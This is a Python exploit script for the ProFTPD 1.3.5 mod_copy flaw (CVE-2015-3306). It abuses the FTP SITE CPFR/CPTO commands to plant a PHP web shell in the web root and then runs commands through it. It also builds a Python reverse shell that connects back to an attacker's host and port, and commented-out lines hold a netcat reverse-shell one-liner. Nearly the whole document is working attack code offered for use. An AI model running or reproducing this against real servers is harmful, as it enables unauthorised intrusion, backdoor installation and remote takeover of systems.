# ProFTPD 1.3.5
# CVE : 2015-3306
# m4ud

#import base64
import socket
import sys
import requests
import re
from optparse import OptionParser


print('ProFTPd 1.3.5 File Uploader')

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
class ProFTPDExploit:
	def __init__(self, options): 
		self.lhost = options.lhost
		self.target = options.target
		self.directory = options.directory
		self.command = options.command
		self.file = options.file
		self.lport = options.lport
		self.shell = options.shell
		if self.lhost is not None and self.lport is not None:
			print("IP is: %s" % (self.lhost))


		if(len(sys.argv) < 4):

			print('\n Usage, Uploading Backdoor: exploit.py -t server -d directory -c cmd -f backdoorName')
			print('\n Usage, Reverse Shell: exploit.py -t server -f backdoorName -l lhost -p lport')
		else:
			r = requests.get('http://' + self.target + '/' + self.file +'?m4ud=ls')
			if self.file in r.text:

				if self.file in r.text and self.lhost is not None and self.lport is not None:
					server = self.target
					lhost = self.lhost
					lport = self.lport
					directory = self.directory # Path accessible from web .....
					cmd = self.command #PHP payload to be executed
					shell = self.shell #reverseShell 

#					with open("shell", "wb") as f: 
#						f.write(b"rm /tmp/t;mkfifo /tmp/t;cat /tmp/t|/bin/sh -i 2>&1|nc " +bytes(self.lhost,encoding='utf-8') + b" " + bytes(self.lport,encoding='utf-8') + b" >/tmp/t")
#					revShell ="rm /tmp/t;mkfifo /tmp/t;cat /tmp/t|/bin/sh -i 2>&1|nc " +self.lhost + " " + self.lport + " >/tmp/t"
					revShell = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""" + '"' + lhost +'"' +","+ lport + """));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'"""
#					print(revShell)
#					rev4 = base64.b64encode('{}\n'.format(revShell.rstrip()).encode('utf-8')).decode('utf-8')
#					print(rev4)
					print('[*] Send1ng awesome request!')
					print('[*] Check your NetCat Listener, mate!!')
					r = requests.get('http://' + server + '/' + self.file + "?m4ud=" + revShell)
					s.close()

				else:
					print('[*] Uploading z3 Sh1z3l')
					server = self.target
					directory = self.directory # Path accessible from web .....
					cmd = self.command #PHP payload to be executed
					file = self.file #Backdoor name for comodity 
					evil = "<?php echo system($_REQUEST['m4ud']); ?>"
					s.connect((server, 21))
					s.recv(1024)
					print('[ + ] Connected to server [ + ]')
					s.send(b"site cpfr /proc/self/cmdline\n")
					print('[ + ] Chill that will take a few seconds!!')
					s.recv(1024)
					s.send(b"site cpto /tmp/." + bytes(evil, encoding= 'utf-8')+  b"\n")
					s.recv(1024)
					s.send(b"site cpfr /tmp/." + bytes(evil, encoding= 'utf-8')+ b"\n")
					s.recv(1024)
					s.send(b"site cpto " + bytes(directory, encoding= 'utf-8') + b"/"+ bytes(file, encoding= 'utf-8')+ b"\n")
					s.recv(1024)
					s.close()
					print('[ + ] Payload has been sent [ + ]')
					print('[ + ] Executing ze Sh1z3l [ + ]')
					if self.command is not None:
						r1 = requests.get('http://' + server + '/' + file +"?m4ud=sed -n -i 's/^.*tmp\/.//p' " + file)
						r = requests.get('http://' + server + '/' + file +'?m4ud='+ cmd) #Executing PHP payload through HTTP
						if (r.status_code == 200):

							print('[ * ] Payload Executed Succesfully [ * ]')
							print(r.text)
						else:
							print('Failz')
					else:
						print(' [ - ] Error : ' + str(r.status_code) + ' [ - ]')


def main():
	parser = OptionParser()
	parser.add_option("-h", "--lhost", dest="lhost", help="Local IP Required for Reverse Shell, ")
	parser.add_option("-p", "--lport", dest="lport", help="Port Required for Reverse Shell, ")
	parser.add_option("-t", "--target", dest="target", help="Vulnerable Target, ")
	parser.add_option("-d", "--dir", dest="directory",default='/var/www/html', help="WebRoot directory to Upload Backdoor, ")
	parser.add_option("-c", "--command", dest="command", help="System Command, ")
	parser.add_option("-f", "--file", dest="file",default="shell.php", help="Backdoor Name, ")	
	parser.add_option("-s", "--shell", dest="shell", help="ReverShell Name, ") 
	(options, args) = parser.parse_args() 
	exploit = ProFTPDExploit(options) 
if __name__=="__main__": 
	main()

